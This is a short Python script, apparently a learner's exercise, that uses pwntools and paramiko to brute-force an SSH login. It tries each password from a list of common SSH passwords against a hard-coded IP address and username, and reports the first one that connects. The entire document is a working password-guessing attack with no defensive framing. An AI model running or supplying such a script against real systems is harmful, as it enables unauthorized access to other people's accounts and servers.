from pwn import *
import paramiko

host = '223.190.80.46'
username = 'maahi'
attemps = 0

with open("F:/htlm/Hacking python/top-20-common-SSH-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] attempting password: '{}'!".format(attemps, password))
            response = ssh(host=host, user=username, password=password, timeout=15)
            if response.connected():
                print("[>] valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] invalid password!")
        attemps += 1
        
